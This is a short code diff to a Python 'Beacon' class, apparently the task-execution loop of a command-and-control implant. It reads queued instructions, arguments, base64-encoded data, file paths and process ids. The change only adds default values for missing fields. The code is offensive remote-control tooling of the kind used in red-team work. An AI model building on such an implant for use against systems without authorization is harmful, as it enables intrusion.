@@ -62,13 +62,27 @@ class Beacon:
 
     def execInstruction(self):
         for it in self.tasks:
-            instruction = it["instruction"]
-            args = it["args"]
-            cmd = it["cmd"]
-            data = base64.b64decode(it["data"].encode('utf-8'))
-            inputFile = base64.b64decode(it["inputFile"].encode('utf-8')).decode('utf-8')
-            outputFile = base64.b64decode(it["outputFile"].encode('utf-8')).decode('utf-8')
-            pid = it["pid"]
+            instruction = ""
+            if "instruction" in it:
+                instruction = it["instruction"]
+            args = ""
+            if "args" in it:
+                args = it["args"]
+            cmd = ""
+            if "cmd" in it:
+                cmd = it["cmd"]
+            data = b""
+            if "data" in it:
+                data = base64.b64decode(it["data"].encode('utf-8'))
+            inputFile = ""
+            if "inputFile" in it:
+                inputFile = base64.b64decode(it["inputFile"].encode('utf-8')).decode('utf-8')
+            outputFile = ""
+            if "outputFile" in it:
+                outputFile = base64.b64decode(it["outputFile"].encode('utf-8')).decode('utf-8')
+            pid = -1
+            if "pid" in it:
+                pid = it["pid"]
 
             result = ""
             if instruction == "ls":
